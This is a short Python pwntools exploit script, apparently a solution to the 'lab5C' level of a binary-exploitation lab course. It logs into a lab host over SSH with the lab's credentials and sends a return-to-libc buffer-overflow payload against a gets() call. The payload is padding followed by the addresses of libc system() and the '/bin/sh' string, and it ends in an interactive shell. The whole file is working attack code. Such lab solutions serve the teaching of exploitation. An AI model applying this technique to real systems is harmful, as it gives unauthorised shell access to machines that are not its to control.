from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# void copytoglobal()
# {
#     char buffer[128] = {0};
#     gets(buffer);
#     memcpy(global_str, buffer, 128);
# }
# No input length check, copies buffer into global_str[128].

# crash @ 0x080486ee
s = ssh(host='192.168.203.146', user='lab5C', password='lab05start')
p = s.process("/levels/lab05/./lab5C")
#gdb.attach(p)

# gdb 0xf7dfec00 <__libc_system>
# libc_system = 0xf7dfec00
# real 0xb7e63190 <__libc_system>
libc_system = 0xb7e63190


# binbash = 0xffffd686 # gdb
# binbash = 0xbffff8e0 # real binary (Doesn't work, why?)
binsh = 0xb7f83a24 # real libc '/bin/sh'


payload = ""
payload += "A" * 156
payload += p32(libc_system)
payload += "JUNK"
payload += p32(binsh)

print p.recv()
p.sendline(payload)
p.interactive()
